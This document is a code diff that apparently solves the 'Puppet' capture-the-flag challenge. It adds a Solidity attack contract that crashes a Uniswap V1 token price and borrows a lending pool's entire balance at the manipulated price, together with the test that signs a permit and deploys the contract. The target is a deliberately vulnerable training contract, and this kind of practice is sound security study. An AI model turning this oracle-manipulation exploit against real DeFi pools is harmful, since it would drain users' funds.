@@ -8,6 +8,47 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+contract AttackPuppet {
+    constructor(
+        address _token,
+        address _uniswapPair,
+        address _lendingPool,
+        address _recovery,
+        uint256 _amount,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) payable {
+        DamnValuableToken token = DamnValuableToken(_token);
+        IUniswapV1Exchange exchange = IUniswapV1Exchange(_uniswapPair);
+        PuppetPool pool = PuppetPool(_lendingPool);
+
+        // 1. Permit attacker to spend player's tokens
+        token.permit(msg.sender, address(this), _amount, block.timestamp, v, r, s);
+
+        // 2. Transfer tokens from player to attacker
+        token.transferFrom(msg.sender, address(this), _amount);
+
+        // 3. Approve Uniswap to spend tokens
+        token.approve(address(exchange), _amount);
+
+        // 4. Sell all tokens for ETH to crash the price
+        exchange.tokenToEthSwapInput(_amount, 1, block.timestamp * 2);
+
+        // 5. Calculate required deposit with the manipulated price
+        uint256 poolTokenBalance = token.balanceOf(address(pool));
+        uint256 depositRequired = pool.calculateDepositRequired(poolTokenBalance);
+
+        // 6. Borrow all tokens from the pool
+        pool.borrow{value: depositRequired}(poolTokenBalance, _recovery);
+
+        // 7. Refund remaining ETH to player
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +133,41 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Calculate the address of the attack contract before deployment
+        address attacker = vm.computeCreateAddress(player, vm.getNonce(player));
+
+        // Prepare permit signature
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                token.DOMAIN_SEPARATOR(),
+                keccak256(
+                    abi.encode(
+                        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+                        player,
+                        attacker,
+                        PLAYER_INITIAL_TOKEN_BALANCE,
+                        token.nonces(player),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+
+        // Deploy the attack contract
+        // We leave 1 ETH behind for gas, though much less is needed.
+        new AttackPuppet{value: PLAYER_INITIAL_ETH_BALANCE - 1e18}(
+            address(token),
+            address(uniswapV1Exchange),
+            address(lendingPool),
+            recovery,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            v,
+            r,
+            s
+        );
     }
 
     // Utility function to calculate Uniswap prices
